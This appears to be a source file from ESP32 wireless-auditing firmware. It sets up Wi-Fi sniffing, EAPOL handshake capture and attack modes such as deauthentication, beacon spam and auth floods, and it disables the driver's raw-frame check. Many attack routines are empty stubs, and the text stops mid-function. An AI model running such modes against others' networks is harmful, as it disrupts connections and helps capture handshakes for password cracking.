#include "WiFiScan.h"
#include "lang_var.h"

int num_beacon = 0;
int num_deauth = 0;
int num_probe = 0;
int num_eapol = 0;

LinkedList<ssid>* ssids;
LinkedList<AccessPoint>* access_points;
LinkedList<Station>* stations;

// extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
//     if (arg == 31337)
//       return 1;
//     else
//       return 0;
// }

extern "C" {
  uint8_t esp_base_mac_addr[6];
  esp_err_t esp_ble_gap_set_rand_addr(const uint8_t *rand_addr);
}

WiFiScan::WiFiScan()
{
}

void WiFiScan::RunSetup() {
  // if (ieee80211_raw_frame_sanity_check(31337, 0, 0) == 1)
    this->wsl_bypass_enabled = true;
  // else
  //   this->wsl_bypass_enabled = false;
    
  ssids = new LinkedList<ssid>();
  access_points = new LinkedList<AccessPoint>();
  stations = new LinkedList<Station>();

  this->initWiFi(1);
}

int WiFiScan::clearStations() {
  int num_cleared = stations->size();
  stations->clear();
  Serial.println("stations: " + (String)stations->size());

  // Now clear stations list from APs
  for (int i = 0; i < access_points->size(); i++)
    access_points->get(i).stations->clear();
    
  return num_cleared;
}

bool WiFiScan::checkMem() {
  if (esp_get_free_heap_size() <= MEM_LOWER_LIM)
    return false;
  else
    return true;
}

int WiFiScan::clearAPs() {
  int num_cleared = access_points->size();
  while (access_points->size() > 0)
    access_points->remove(0);
  Serial.println("access_points: " + (String)access_points->size());
  return num_cleared;
}

int WiFiScan::clearSSIDs() {
  int num_cleared = ssids->size();
  ssids->clear();
  Serial.println("ssids: " + (String)ssids->size());
  return num_cleared;
}

bool WiFiScan::addSSID(String essid) {
  ssid s = {essid, random(1, 12), {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
  ssids->add(s);
  Serial.println(ssids->get(ssids->size() - 1).essid);

  return true;
}

int WiFiScan::generateSSIDs(int count) {
  uint8_t num_gen = count;
  for (uint8_t x = 0; x < num_gen; x++) {
    String essid = "";

    for (uint8_t i = 0; i < 6; i++)
      essid.concat(alfa[random(65)]);

    ssid s = {essid, random(1, 12), {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
    ssids->add(s);
    Serial.println(ssids->get(ssids->size() - 1).essid);
  }

  return num_gen;
}

// Apply WiFi settings
void WiFiScan::initWiFi(uint8_t scan_mode) {
  // Set the channel
  if (scan_mode != WIFI_SCAN_OFF) {
    Serial.println(F("Initializing WiFi settings..."));
    this->changeChannel();
  
    Serial.println(F("Initialization complete"));
  }
}

bool WiFiScan::scanning() {
  if (this->currentScanMode == WIFI_SCAN_OFF)
    return false;
  else
    return true;
}

// Function to prepare to run a specific scan
void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color)
{  
  this->initWiFi(scan_mode);
  if (scan_mode == WIFI_SCAN_OFF)
    StopScan(scan_mode);
  else if (scan_mode == WIFI_SCAN_PROBE)
    RunProbeScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_STATION_WAR_DRIVE)
    RunProbeScan(scan_mode, color);
  //else if (scan_mode == WIFI_SCAN_EVIL_PORTAL)
    //RunEvilPortal(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_EAPOL)
    RunEapolScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_ACTIVE_EAPOL)
    RunEapolScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_ACTIVE_LIST_EAPOL)
    RunEapolScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_AP)
    RunBeaconScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_WAR_DRIVE)
    RunBeaconScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_SIG_STREN)
    RunRawScan(scan_mode, color);    
  else if (scan_mode == WIFI_SCAN_RAW_CAPTURE)
    RunRawScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_STATION)
    RunStationScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_TARGET_AP)
    RunAPScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_TARGET_AP_FULL)
    RunAPScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_PWN)
    RunPwnScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_DEAUTH)
    RunDeauthScan(scan_mode, color);
  else if (scan_mode == WIFI_PACKET_MONITOR) {

  }
  else if (scan_mode == WIFI_ATTACK_BEACON_LIST)
    this->startWiFiAttacks(scan_mode, color, text_table1[50]);
  else if (scan_mode == WIFI_ATTACK_BEACON_SPAM)
    this->startWiFiAttacks(scan_mode, color, text_table1[51]);
  else if (scan_mode == WIFI_ATTACK_RICK_ROLL)
    this->startWiFiAttacks(scan_mode, color, text_table1[52]);
  else if (scan_mode == WIFI_ATTACK_AUTH)
    this->startWiFiAttacks(scan_mode, color, text_table1[53]);
  else if (scan_mode == WIFI_ATTACK_DEAUTH)
    this->startWiFiAttacks(scan_mode, color, text_table4[8]);
  else if (scan_mode == WIFI_ATTACK_DEAUTH_MANUAL)
    this->startWiFiAttacks(scan_mode, color, text_table4[8]);
  else if (scan_mode == WIFI_ATTACK_DEAUTH_TARGETED)
    this->startWiFiAttacks(scan_mode, color, text_table4[47]);
  else if (scan_mode == WIFI_ATTACK_AP_SPAM)
    this->startWiFiAttacks(scan_mode, color, " AP Beacon Spam ");
  else if (scan_mode == BT_SCAN_ALL) {

  }
  else if (scan_mode == BT_ATTACK_SOUR_APPLE) {

  }
  else if ((scan_mode == BT_ATTACK_SWIFTPAIR_SPAM) || 
           (scan_mode == BT_ATTACK_SPAM_ALL) ||
           (scan_mode == BT_ATTACK_SAMSUNG_SPAM) ||
           (scan_mode == BT_ATTACK_GOOGLE_SPAM)) {

  }
  else if ((scan_mode == BT_SCAN_WAR_DRIVE) ||
           (scan_mode == BT_SCAN_WAR_DRIVE_CONT)) {

  }
  else if (scan_mode == BT_SCAN_SKIMMERS) {

  }
  else if (scan_mode == LV_ADD_SSID) {

  }
  else if (scan_mode == WIFI_SCAN_GPS_NMEA){

  }

  WiFiScan::currentScanMode = scan_mode;
}

void WiFiScan::startWiFiAttacks(uint8_t scan_mode, uint16_t color, String title_string) {
  // Common wifi attack configurations

  //wifi_ap_config_t ap_config;
  //ap_config.ssid_hidden = 1;

  ap_config.ap.ssid_hidden = 1;
  ap_config.ap.beacon_interval = 10000;
  ap_config.ap.ssid_len = 0;
        
  packets_sent = 0;
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP);
  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
  esp_wifi_start();
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  
  //WiFi.mode(WIFI_AP_STA);
  
  //esp_wifi_init(&cfg);
  //esp_wifi_set_storage(WIFI_STORAGE_RAM);
  //esp_wifi_set_mode(WIFI_AP_STA);
  //esp_wifi_start();
  //esp_wifi_set_promiscuous_filter(NULL);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_max_tx_power(82);
  this->wifi_initialized = true;

  initTime = millis();
}

bool WiFiScan::shutdownWiFi() {
  if (this->wifi_initialized) {
    esp_wifi_set_promiscuous(false);
    WiFi.disconnect();
    WiFi.mode(WIFI_OFF);

    dst_mac = "ff:ff:ff:ff:ff:ff";
  
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_stop();
    esp_wifi_restore();
    esp_wifi_deinit();
  
    this->wifi_initialized = false;
    return true;
  }
  else {
    return false;
  }
}
// Function to stop all wifi scans
void WiFiScan::StopScan(uint8_t scan_mode)
{
  if ((currentScanMode == WIFI_SCAN_PROBE) ||
  (currentScanMode == WIFI_SCAN_AP) ||
  (currentScanMode == WIFI_SCAN_WAR_DRIVE) ||
  (currentScanMode == WIFI_SCAN_STATION_WAR_DRIVE) ||
  (currentScanMode == WIFI_SCAN_EVIL_PORTAL) ||
  (currentScanMode == WIFI_SCAN_RAW_CAPTURE) ||
  (currentScanMode == WIFI_SCAN_STATION) ||
  (currentScanMode == WIFI_SCAN_SIG_STREN) ||
  (currentScanMode == WIFI_SCAN_TARGET_AP) ||
  (currentScanMode == WIFI_SCAN_TARGET_AP_FULL) ||
  (currentScanMode == WIFI_SCAN_PWN) ||
  (currentScanMode == WIFI_SCAN_EAPOL) ||
  (currentScanMode == WIFI_SCAN_ACTIVE_EAPOL) ||
  (currentScanMode == WIFI_SCAN_ACTIVE_LIST_EAPOL) ||
  (currentScanMode == WIFI_SCAN_ALL) ||
  (currentScanMode == WIFI_SCAN_DEAUTH) ||
  (currentScanMode == WIFI_ATTACK_BEACON_LIST) ||
  (currentScanMode == WIFI_ATTACK_BEACON_SPAM) ||
  (currentScanMode == WIFI_ATTACK_AUTH) ||
  (currentScanMode == WIFI_ATTACK_DEAUTH) ||
  (currentScanMode == WIFI_ATTACK_DEAUTH_MANUAL) ||
  (currentScanMode == WIFI_ATTACK_DEAUTH_TARGETED) ||
  (currentScanMode == WIFI_ATTACK_MIMIC) ||
  (currentScanMode == WIFI_ATTACK_RICK_ROLL) ||
  (currentScanMode == WIFI_PACKET_MONITOR) ||
  (currentScanMode == LV_JOIN_WIFI))
  {
    this->shutdownWiFi();
  }

  
  else if ((currentScanMode == BT_SCAN_ALL) ||
  (currentScanMode == BT_ATTACK_SOUR_APPLE) ||
  (currentScanMode == BT_ATTACK_SWIFTPAIR_SPAM) ||
  (currentScanMode == BT_ATTACK_SPAM_ALL) ||
  (currentScanMode == BT_ATTACK_SAMSUNG_SPAM) ||
  (currentScanMode == BT_ATTACK_GOOGLE_SPAM) ||
  (currentScanMode == BT_SCAN_WAR_DRIVE) ||
  (currentScanMode == BT_SCAN_WAR_DRIVE_CONT) ||
  (currentScanMode == BT_SCAN_SKIMMERS))
  {

  }
}

String WiFiScan::getStaMAC()
{
  char *buf;
  uint8_t mac[6];
  char macAddrChr[18] = {0};
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_err_t mac_status = esp_wifi_get_mac(WIFI_IF_AP, mac);
  this->wifi_initialized = true;
  sprintf(macAddrChr, 
          "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0],
          mac[1],
          mac[2],
          mac[3],
          mac[4],
          mac[5]);
  this->shutdownWiFi();
  return String(macAddrChr);
}

String WiFiScan::getApMAC()
{
  char *buf;
  uint8_t mac[6];
  char macAddrChr[18] = {0};
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_err_t mac_status = esp_wifi_get_mac(WIFI_IF_AP, mac);
  this->wifi_initialized = true;
  sprintf(macAddrChr, 
          "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0],
          mac[1],
          mac[2],
          mac[3],
          mac[4],
          mac[5]);
  this->shutdownWiFi();
  return String(macAddrChr);
}

bool WiFiScan::mac_cmp(struct mac_addr addr1, struct mac_addr addr2) {
  //Return true if 2 mac_addr structs are equal.
  for (int y = 0; y < 6 ; y++) {
    if (addr1.bytes[y] != addr2.bytes[y]) {
      return false;
    }
  }
  return true;
}

bool WiFiScan::seen_mac(unsigned char* mac) {
  //Return true if this MAC address is in the recently seen array.

  struct mac_addr tmp;
  for (int x = 0; x < 6 ; x++) {
    tmp.bytes[x] = mac[x];
  }

  for (int x = 0; x < mac_history_len; x++) {
    if (this->mac_cmp(tmp, this->mac_history[x])) {
      return true;
    }
  }
  return false;
}

void WiFiScan::save_mac(unsigned char* mac) {
  //Save a MAC address into the recently seen array.
  if (this->mac_history_cursor >= mac_history_len) {
    this->mac_history_cursor = 0;
  }
  struct mac_addr tmp;
  for (int x = 0; x < 6 ; x++) {
    tmp.bytes[x] = mac[x];
  }

  this->mac_history[this->mac_history_cursor] = tmp;
  this->mac_history_cursor++;
}

String WiFiScan::security_int_to_string(int security_type) {
  //Provide a security type int from WiFi.encryptionType(i) to convert it to a String which Wigle CSV expects.
  String authtype = "";

  switch (security_type) {
    case WIFI_AUTH_OPEN:
      authtype = "[OPEN]";
      break;
  
    case WIFI_AUTH_WEP:
      authtype = "[WEP]";
      break;
  
    case WIFI_AUTH_WPA_PSK:
      authtype = "[WPA_PSK]";
      break;
  
    case WIFI_AUTH_WPA2_PSK:
      authtype = "[WPA2_PSK]";
      break;
  
    case WIFI_AUTH_WPA_WPA2_PSK:
      authtype = "[WPA_WPA2_PSK]";
      break;
  
    case WIFI_AUTH_WPA2_ENTERPRISE:
      authtype = "[WPA2]";
      break;

    //Requires at least v2.0.0 of https://github.com/espressif/arduino-esp32/
    case WIFI_AUTH_WPA3_PSK:
      authtype = "[WPA3_PSK]";
      break;

    case WIFI_AUTH_WPA2_WPA3_PSK:
      authtype = "[WPA2_WPA3_PSK]";
      break;

    case WIFI_AUTH_WAPI_PSK:
      authtype = "[WAPI_PSK]";
      break;
        
    default:
      authtype = "[UNDEFINED]";
  }

  return authtype;
}

void WiFiScan::clearMacHistory() {
    for (int i = 0; i < mac_history_len; ++i) {
        memset(this->mac_history[i].bytes, 0, sizeof(mac_history[i].bytes));
    }
}

String WiFiScan::freeRAM()
{
  char s[150];
  sprintf(s, "RAM Free: %u bytes", esp_get_free_heap_size());
  this->free_ram = String(esp_get_free_heap_size());
  return String(s);
}

void WiFiScan::startPcap(String file_name) {
  buffer_obj.pcapOpen(
    file_name,
    #if defined(HAS_SD)
      sd_obj.supported ? &SD :
    #endif
    NULL,
    save_serial // Set with commandline options
  );
}

void WiFiScan::startLog(String file_name) {
  buffer_obj.logOpen(
    file_name,
    #if defined(HAS_SD)
      sd_obj.supported ? &SD :
    #endif
    NULL,
    save_serial // Set with commandline options
  );
}

// void WiFiScan::RunEvilPortal(uint8_t scan_mode, uint16_t color)
// {
//   startLog("evil_portal");

//   evil_portal_obj.begin(ssids, access_points);
//   //if (!evil_portal_obj.begin(ssids, access_points)) {
//   //  Serial.println("Could not successfully start EvilPortal. Setting WIFI_SCAN_OFF...");
//   //  this->StartScan(WIFI_SCAN_OFF, TFT_MAGENTA);
//   //  return;
//   //}
//   //else
//   //  Serial.println("Setup EvilPortal. Current mode: " + this->currentScanMode);
//   this->wifi_initialized = true;
//   initTime = millis();
// }

// Function to start running a beacon scan
void WiFiScan::RunAPScan(uint8_t scan_mode, uint16_t color)
{
  startPcap("ap");

  Serial.println(text_table4[9] + (String)access_points->size());

  delete access_points;
  access_points = new LinkedList<AccessPoint>();

  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  //if (scan_mode == WIFI_SCAN_TARGET_AP_FULL)
  esp_wifi_set_promiscuous_rx_cb(&apSnifferCallbackFull);
  //else
  //  esp_wifi_set_promiscuous_rx_cb(&apSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::RunClearStations() {

  this->clearStations();

}

void WiFiScan::RunClearAPs() {

  this->clearAPs();
  this->clearStations();

}

void WiFiScan::RunClearSSIDs() {

  this->clearSSIDs();

}

void WiFiScan::RunGenerateSSIDs(int count) {

  this->generateSSIDs(count);

}

void WiFiScan::RunGPSInfo() {

}

void WiFiScan::RunGPSNmea() {

}

void WiFiScan::RunInfo()
{
  String sta_mac = this->getStaMAC();
  String ap_mac = this->getApMAC();
  String free_ram = this->freeRAM();

  Serial.println(free_ram);
}

void WiFiScan::RunPacketMonitor(uint8_t scan_mode, uint16_t color)
{

  startPcap("packet_monitor");

  Serial.println("Running packet scan...");
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&wifiSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  uint32_t initTime = millis();
}

void WiFiScan::RunEapolScan(uint8_t scan_mode, uint16_t color)
{
  
  num_eapol = 0;

  startPcap("eapol");

  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_AP);

  esp_err_t err;
  wifi_config_t conf;
  err = esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR);
  if (err != 0)
  {
    Serial.print("could not set protocol : err=0x");
    Serial.println(err, HEX);
  }

  esp_wifi_get_config((wifi_interface_t)WIFI_IF_AP, &conf);
  conf.ap.ssid[0] = '\0';
  conf.ap.ssid_len = 0;
  conf.ap.channel = this->set_channel;
  conf.ap.ssid_hidden = 1;
  conf.ap.max_connection = 0;
  conf.ap.beacon_interval = 60000;

  err = esp_wifi_set_config((wifi_interface_t)WIFI_IF_AP, &conf);
  if (err != 0)
  {
    Serial.print("AP config set error, Maurauder SSID might visible : err=0x");
    Serial.println(err, HEX);
  }

  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  if (scan_mode == WIFI_SCAN_ACTIVE_EAPOL)
    esp_wifi_set_promiscuous_rx_cb(&activeEapolSnifferCallback);
  else if (scan_mode == WIFI_SCAN_ACTIVE_LIST_EAPOL)
    esp_wifi_set_promiscuous_rx_cb(&activeEapolSnifferCallback);
  else
    esp_wifi_set_promiscuous_rx_cb(&eapolSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}


// Function to prepare for beacon mimic
void WiFiScan::RunMimicFlood(uint8_t scan_mode, uint16_t color) {
  
  packets_sent = 0;
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_AP_STA);
  esp_wifi_start();
  esp_wifi_set_promiscuous_filter(NULL);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_max_tx_power(78);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::RunPwnScan(uint8_t scan_mode, uint16_t color)
{
  startPcap("pwnagotchi");
  
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&pwnSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::executeSourApple() {

}

const char* WiFiScan::generateRandomName() {
  const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  int len = rand() % 10 + 1; // Generate a random length between 1 and 10
  char* randomName = (char*)malloc((len + 1) * sizeof(char)); // Allocate memory for the random name
  for (int i = 0; i < len; ++i) {
    randomName[i] = charset[rand() % strlen(charset)]; // Select random characters from the charset
  }
  randomName[len] = '\0'; // Null-terminate the string
  return randomName;
}

void WiFiScan::generateRandomMac(uint8_t* mac) {
  // Set the locally administered bit and unicast bit for the first byte
  mac[0] = 0x02; // The locally administered bit is the second least significant bit

  // Generate the rest of the MAC address
  for (int i = 1; i < 6; i++) {
    mac[i] = random(0, 255);
  }
}

void WiFiScan::executeSwiftpairSpam(EBLEPayloadType type) {

}

void WiFiScan::executeWarDrive() {

}

// Function to start running a beacon scan
void WiFiScan::RunBeaconScan(uint8_t scan_mode, uint16_t color)
{
  if (scan_mode == WIFI_SCAN_AP)
    startPcap("beacon");
  else if (scan_mode == WIFI_SCAN_WAR_DRIVE) {

    return;

  }

  if (scan_mode != WIFI_SCAN_WAR_DRIVE) {
  
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);
    esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  }
  else {
    this->startWardriverWiFi();
  }
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::startWardriverWiFi() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
}

void WiFiScan::RunStationScan(uint8_t scan_mode, uint16_t color)
{
  startPcap("station");
  
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&stationSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::RunRawScan(uint8_t scan_mode, uint16_t color)
{
  if (scan_mode != WIFI_SCAN_SIG_STREN)
    startPcap("raw");
  
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&rawSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::RunDeauthScan(uint8_t scan_mode, uint16_t color)
{
  startPcap("deauth");
  
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&deauthSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}


// Function for running probe request scan
void WiFiScan::RunProbeScan(uint8_t scan_mode, uint16_t color)
{
  if (scan_mode == WIFI_SCAN_PROBE)
    startPcap("probe");
  else if (scan_mode == WIFI_SCAN_STATION_WAR_DRIVE) {
    return;
  }
  
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&probeSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::RunSourApple(uint8_t scan_mode, uint16_t color) {

}

void WiFiScan::RunSwiftpairSpam(uint8_t scan_mode, uint16_t color) {

}

// Function to start running any BLE scan
void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color)
{

}

// Function to extract MAC addr from a packet at given offset
void WiFiScan::getMAC(char *addr, uint8_t* data, uint16_t offset) {
  sprintf(addr, "%02x:%02x:%02x:%02x:%02x:%02x", data[offset+0], data[offset+1], data[offset+2], data[offset+3], data[offset+4], data[offset+5]);
}

void WiFiScan::pwnSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{ 
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String src = "";
  String essid = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    int buf = 0;

    
    if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
    {
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);
      src.concat(addr);
      if (src == "de:ad:be:ef:de:ad") {
        
        
        delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" BSSID: ");
        Serial.print(addr);
        //display_string.concat(addr);
        display_string.concat("CH: " + (String)snifferPacket->rx_ctrl.channel);
        Serial.print(" ESSID: ");
        display_string.concat(" -> ");

        // Just grab the first 255 bytes of the pwnagotchi beacon
        // because that is where the name is
        //for (int i = 0; i < snifferPacket->payload[37]; i++)
        for (int i = 0; i < len - 37; i++)
        {
          Serial.print((char)snifferPacket->payload[i + 38]);
          //display_string.concat((char)snifferPacket->payload[i + 38]);
          if (isAscii(snifferPacket->payload[i + 38]))
            essid.concat((char)snifferPacket->payload[i + 38]);
          else
            Serial.println("Got non-ascii character: " + (String)(char)snifferPacket->payload[i + 38]);
        }
        //essid.concat("\": \"\"}}");
        //Serial.println("\n" + (String)(snifferPacket->payload[37]) + " -> " + essid);

        // Load json
        //DynamicJsonBuffer jsonBuffer; // ArduinoJson v5
        DynamicJsonDocument json(1024); // ArduinoJson v6
        //JsonObject& json = jsonBuffer.parseObject(essid); // ArduinoJson v5
         // ArduinoJson v6
        if (deserializeJson(json, essid)) {
          Serial.println("\nCould not parse Pwnagotchi json");
          display_string.concat(essid);
        }
        else {
          Serial.println("\nSuccessfully parsed json");
          String json_output;
          //json.printTo(json_output); // ArduinoJson v5
          serializeJson(json, json_output); // ArduinoJson v6
          Serial.println(json_output);
          display_string.concat(json["name"].as<String>() + " pwnd: " + json["pwnd_tot"].as<String>());
        }
  
        int temp_len = display_string.length();
        for (int i = 0; i < 40 - temp_len; i++)
        {
          display_string.concat(" ");
        }
  
        Serial.print(" ");

        Serial.println();

        buffer_obj.append(snifferPacket, len);
      }
    }
  }
}

void WiFiScan::apSnifferCallbackFull(void* buf, wifi_promiscuous_pkt_type_t type) {  
  extern WiFiScan wifi_scan_obj;
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String essid = "";
  String bssid = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;

    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP

    int buf = 0;

    if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
    {
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);

      bool in_list = false;
      bool mac_match = true;

      for (int i = 0; i < access_points->size(); i++) {
        mac_match = true;
        //Serial.print("Checking ");
        //Serial.print(addr);
        //Serial.println(" against " + (String)access_points->get(i).essid);

        
        for (int x = 0; x < 6; x++) {
          //Serial.println((String)snifferPacket->payload[x + 10] + " | " + (String)access_points->get(i).bssid[x]);
          if (snifferPacket->payload[x + 10] != access_points->get(i).bssid[x]) {
            mac_match = false;
            //Serial.println("MACs do not match");
            break;
          }
        }
        if (mac_match) {
          in_list = true;
          break;
        }
      }

      if (!in_list) {
      
        delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" BSSID: ");
        Serial.print(addr);
        display_string.concat(addr);
        Serial.print(" ESSID: ");
        display_string.concat(" -> ");
        for (int i = 0; i < snifferPacket->payload[37]; i++)
        {
          Serial.print((char)snifferPacket->payload[i + 38]);
          display_string.concat((char)snifferPacket->payload[i + 38]);
          essid.concat((char)snifferPacket->payload[i + 38]);

          
        }

        bssid.concat(addr);
  
        int temp_len = display_string.length();
        for (int i = 0; i < 40 - temp_len; i++)
        {
          display_string.concat(" ");
        }
  
        Serial.print(" ");
        
        if (essid == "") {
          essid = bssid;
          Serial.print(essid + " ");
        }

        AccessPoint ap;
        ap.essid = essid;
        ap.channel = snifferPacket->rx_ctrl.channel;
        ap.bssid[0] = snifferPacket->payload[10];
        ap.bssid[1] = snifferPacket->payload[11];
        ap.bssid[2] = snifferPacket->payload[12];
        ap.bssid[3] = snifferPacket->payload[13];
        ap.bssid[4] = snifferPacket->payload[14];
        ap.bssid[5] = snifferPacket->payload[15];
        ap.selected = false;
        ap.stations = new LinkedList<uint8_t>();
        
        ap.beacon = new LinkedList<char>();

        ap.beacon->add(snifferPacket->payload[34]);
        ap.beacon->add(snifferPacket->payload[35]);

        Serial.print("\nBeacon: ");

        for (int i = 0; i < ap.beacon->size(); i++) {
          char hexCar[4];
          sprintf(hexCar, "%02X", ap.beacon->get(i));
          Serial.print(hexCar);
          if ((i + 1) % 16 == 0)
            Serial.print("\n");
          else
            Serial.print(" ");
        }

        ap.rssi = snifferPacket->rx_ctrl.rssi;

